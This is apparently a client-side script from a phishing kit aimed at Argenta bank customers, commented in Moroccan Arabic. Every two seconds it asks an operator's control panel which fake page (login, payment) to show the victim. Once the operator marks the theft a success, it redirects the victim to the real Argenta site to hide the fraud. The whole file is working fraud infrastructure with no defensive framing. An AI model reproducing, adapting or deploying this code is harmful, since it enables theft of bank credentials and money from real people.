function autoCheck() {
    // Kan-khdmo b path relative l 'index.php'
    fetch('core/get_status.php') 
    .then(res => res.json())
    .then(data => {
        if (data.action) {
            // Get current page name (index.php, pay.php etc)
            let currentPath = window.location.pathname;
            let currentPage = currentPath.split("/").pop();

            // Ila l-action hya 'go_success', sifto l-site d l-bank nichan
            if (data.action === 'go_success') {
                window.location.href = 'https://www.argenta.be/fr/payer/banque-par-internet.html';
                return;
            }

            // Ila l-page li rāni fiha machi hiya li f l-panel, redirekti
            if (currentPage !== data.action && data.action !== 'waiting') {
                window.location.href = data.action; 
            }
        }
    })
    .catch(e => console.log("Syncing..."));
}

// Check kol 2 tawani
setInterval(autoCheck, 2000);